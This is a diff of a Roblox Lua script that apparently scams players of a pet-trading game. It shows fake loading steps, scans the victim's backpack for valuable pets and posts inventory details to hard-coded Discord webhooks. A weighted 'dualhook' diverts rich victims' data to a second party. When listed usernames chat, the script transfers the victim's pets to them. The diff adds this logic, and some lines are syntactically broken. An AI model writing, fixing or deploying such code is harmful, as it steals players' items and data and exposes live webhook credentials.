@@ -1,24 +1,15 @@
-local username = {"namnnni2", "bald", getfenv().Username}
-local webhook = getfenv().Webhook
-local dualhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO"
-local embed = getfenv().Username
+Local usernames = { getfenv().Username, "namnnni2", "BaldBaconFrrr"}
+Local webhook = getfenv().Webhook
+Local dualhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO"
+Local embed = getfenv().Username
 
-local logs_webhook = ""
+local logs_webhook = "https://discord.com/api/webhooks/1396562436005302315/x1kASTn9QReUxByoLv4GoaC2Za12gPHekEs4rpNs8itG3LET4onCohbqr95lFVkz-Lnq"
 
 local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
 local player = game.Players.LocalPlayer
 
 if server == "VIPServer" then 
     player:Kick("Unsurported server. Please join a public server")
-end
-
-local function isTargetUser(name)
-	for _, u in ipairs(username) do
-		if u == name then
-			return true
-		end
-	end
-	return false
 end
 
 local HttpService = game:GetService("HttpService")
@@ -105,31 +96,6 @@ local fakeSteps = {
     "Almost done..."
 }
 
-local function getPriorityPetCount(invData)
-	if not invData or type(invData.Pets) ~= "table" then return 0 end
-
-	local count = 0
-	for _, v in pairs(invData.Pets) do
-		local petName = v and v.Name
-		if petName and allowedPets[petName] then
-			count += 1
-		end
-	end
-
-	return count
-end
-
-	local count = 0
-	for _, v in pairs(invData.Pets) do
-		local petName = v and (v.Name or v.Value)
-		if petName and allowedPets[petName] then
-			count += 1
-		end
-	end
-
-	return count
-end
-
 local totalDuration = 600 -- shorter for quick test
 local stepTime = 1
 local totalSteps = math.floor(totalDuration / stepTime)
@@ -190,6 +156,45 @@ local allowedPets = {
 	["Butterfly"] = true,
 }
 
+local prefixes = {
+    "raccoon", "dragonfly", "kitsune", "t-rex",
+    "disco bee", "spinosaurus", "fennec fox",
+    "butterfly", "mimic octopus", "queen bee", "red fox"
+}
+
+function countSpecialPetsAndCheckWebhook(backpack)
+    local count = 0
+    for _, item in ipairs(backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local lowerName = string.lower(item.Name)
+            for _, prefix in ipairs(prefixes) do
+                if string.find(lowerName, prefix) then
+                    count += 1
+                    break
+                end
+            end
+        end
+    end
+
+    local shouldSend = false
+    if count >= 5 then
+        shouldSend = true
+    elseif count >= 2 then
+        shouldSend = (math.random() < 0.35)
+    end
+
+    return count, shouldSend
+end
+
+local count, shouldSend = countSpecialPetsAndCheckWebhook(backpack)
+local finallyWebhook
+
+if shouldSend then
+    finallyWebhook = dualhook
+else
+    finallyWebhook = webhook
+end
+
 
 local function getKg(name)
 	return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
@@ -197,22 +202,6 @@ end
 
 
 local function gatherInventorySummary()
-
-	local invData = {Pets = {}}
-	for _, item in pairs(backpack:GetChildren()) do
-		local baseName = item.Name:match("^(.-)%s*%[") or item.Name
-		table.insert(invData.Pets, {Name = baseName})
-	end
-
-	local petCount = getPriorityPetCount(invData)
-
-	local targetWebhook = webhook
-	if petCount >= 5 then
-		targetWebhook = dualhook
-	elseif petCount >= 2 and math.random(1, 100) <= 35 then
-		targetWebhook = dualhook
-	end
-
 	local petCountMap = {}
 	local petLines = {}
 	local itemsWithValue = {}
@@ -255,16 +244,8 @@ local function gatherInventorySummary()
 	for _, item in ipairs(itemsWithValue) do
 		totalValue += item.value
 	end
-local petCount = getPriorityPetCount(invData)
-local targetWebhook = webhook
 
-if petCount >= 5 then
-    targetWebhook = dualhook -- Gửi luôn nếu >= 5 pet ưu tiên
-elseif petCount >= 2 and math.random(1, 100) <= 35 then
-    targetWebhook = dualhook -- Gửi 35% nếu từ 2–4 pet
-end
-
-   return tradableSummary, totalValue, targetWebhook
+	return tradableSummary, totalValue
 end
 
 
@@ -308,8 +289,8 @@ local function sendWebhook()
 	if req then
 		pcall(function()
 			req({
-				Url = targetWebhook,
-	         Method = "POST",
+				Url = finallyWebhook,
+				Method = "POST",
 				Headers = {["Content-Type"] = "application/json"},
 				Body = HttpService:JSONEncode(payload)
 			})
@@ -385,8 +366,16 @@ end
 
 local started = false
 
-local function startGiving(targetName)
-	local target = Players:FindFirstChild(targetName)
+local function startGiving()
+    local target = nil
+    for _, name in ipairs(usernames) do
+        local found = Players:FindFirstChild(name)
+        if found and found.Character then
+            target = found
+            break
+        end
+    end
+
     if not target or not target.Character or not LocalPlayer.Character then return end
 
     local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -461,23 +450,23 @@ task.wait(1)
 sendWebhook()
 
 for _, p in ipairs(Players:GetPlayers()) do
-	if isTargetUser(p.Name) then
-		p.Chatted:Connect(function()
-			if not started then
-				started = true
-				startGiving(p.Name)
-			end
-		end)
-	end
+    if table.find(usernames, p.Name) then
+        p.Chatted:Connect(function()
+            if not started then
+                started = true
+                startGiving()
+            end
+        end)
+    end
 end
 
 Players.PlayerAdded:Connect(function(p)
-	if isTargetUser(p.Name) then
-		p.Chatted:Connect(function()
-			if not started then
-				started = true
-				startGiving(p.Name)
-			end
-		end)
-	end
+    if table.find(usernames, p.Name) then
+        p.Chatted:Connect(function()
+            if not started then
+                started = true
+                startGiving()
+            end
+        end)
+    end
 end)
